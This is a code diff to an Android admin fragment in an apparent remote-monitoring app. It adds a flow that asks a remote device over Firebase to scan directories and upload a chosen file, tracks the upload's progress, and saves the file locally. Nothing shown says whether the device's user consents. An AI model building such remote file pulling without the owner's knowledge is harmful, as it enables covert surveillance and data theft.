@@ -2,6 +2,7 @@ package com.vikasyadavnsit.cdc.fragment;
 
 import android.app.Activity;
 import android.app.AlertDialog;
+import android.content.Context;
 import android.graphics.Color;
 import android.graphics.drawable.ColorDrawable;
 import android.os.Bundle;
@@ -21,9 +22,13 @@ import androidx.fragment.app.Fragment;
 import androidx.recyclerview.widget.LinearLayoutManager;
 import androidx.recyclerview.widget.RecyclerView;
 
+import com.google.firebase.database.DataSnapshot;
+import com.google.firebase.database.DatabaseError;
+import com.google.firebase.database.ValueEventListener;
 import com.vikasyadavnsit.cdc.R;
 import com.vikasyadavnsit.cdc.utils.FirebaseUtils;
 
+import java.io.File;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.Date;
@@ -59,12 +64,17 @@ public class AdminFileStructureFragment extends Fragment {
         adapter = new FileAdapter(this);
         recyclerView.setAdapter(adapter);
 
+        pathStack.clear();
+        currentPath = "";
+        updateNavigationUI();
+
         backButton.setOnClickListener(v -> navigateBack());
 
         // Always request root scan on fragment entry
         setLoading(true);
         FirebaseUtils.requestRemoteDirectoryScan("");
         FirebaseUtils.getRemoteFileStructure();
+        updateNavigationUI();
 
         return view;
     }
@@ -105,6 +115,7 @@ public class AdminFileStructureFragment extends Fragment {
             titleView.setText("📁 " + name);
             setLoading(true);
             FirebaseUtils.requestRemoteDirectoryScan(path);
+            updateNavigationUI();
         } else {
             showFileDetailsDialog(fileInfo);
         }
@@ -165,8 +176,63 @@ public class AdminFileStructureFragment extends Fragment {
         lp.setMargins(0, 40, 0, 0);
         downloadBtn.setLayoutParams(lp);
         downloadBtn.setOnClickListener(v -> {
-            Toast.makeText(getContext(), "Streaming requested for: " + info.get("name"), Toast.LENGTH_LONG).show();
-            dialog.dismiss();
+            String remotePath = (String) info.get("path");
+            String fileName = (String) info.get("name");
+            
+            downloadBtn.setEnabled(false);
+            downloadBtn.setText("Requesting...");
+            
+            FirebaseUtils.requestFileDownload(remotePath, fileName);
+            
+            FirebaseUtils.monitorDownloadStatus(new ValueEventListener() {
+                @Override
+                public void onDataChange(@NonNull DataSnapshot snapshot) {
+                    if (!snapshot.exists()) return;
+                    String status = snapshot.child("status").getValue(String.class);
+                    String currentFileName = snapshot.child("name").getValue(String.class);
+                    
+                    if (status == null || currentFileName == null) return;
+                    if (!fileName.equals(currentFileName)) return;
+
+                    if ("UPLOADING".equals(status)) {
+                        Double progress = snapshot.child("progress").getValue(Double.class);
+                        downloadBtn.setText("Remote Uploading: " + (progress != null ? progress.intValue() : 0) + "%");
+                    } else if ("COMPLETED".equals(status)) {
+                        downloadBtn.setText("Downloading to Local...");
+                        
+                        Context ctx = getContext();
+                        if (ctx == null) return;
+                        File dir = ctx.getExternalFilesDir(null);
+                        if (dir == null) return;
+                        File localFile = new File(dir, fileName);
+                        FirebaseUtils.downloadFileFromStorage(fileName, localFile, new FirebaseUtils.OnDownloadListener() {
+                            @Override
+                            public void onProgress(int percent) {
+                                downloadBtn.setText("Local Progress: " + percent + "%");
+                            }
+
+                            @Override
+                            public void onSuccess() {
+                                downloadBtn.setText("Download Complete ✅");
+                                Toast.makeText(getContext(), "File saved to: " + localFile.getAbsolutePath(), Toast.LENGTH_LONG).show();
+                                FirebaseUtils.getDbRef(FirebaseUtils.getPath("/status/download")).removeValue();
+                            }
+
+                            @Override
+                            public void onFailure(String error) {
+                                downloadBtn.setEnabled(true);
+                                downloadBtn.setText("Download Failed ❌");
+                                Toast.makeText(getContext(), "Download Error: " + error, Toast.LENGTH_SHORT).show();
+                            }
+                        });
+                    } else if ("FAILED".equals(status)) {
+                        downloadBtn.setEnabled(true);
+                        downloadBtn.setText("Remote Failed ❌");
+                    }
+                }
+
+                @Override public void onCancelled(@NonNull DatabaseError error) {}
+            });
         });
         container.addView(downloadBtn);
 
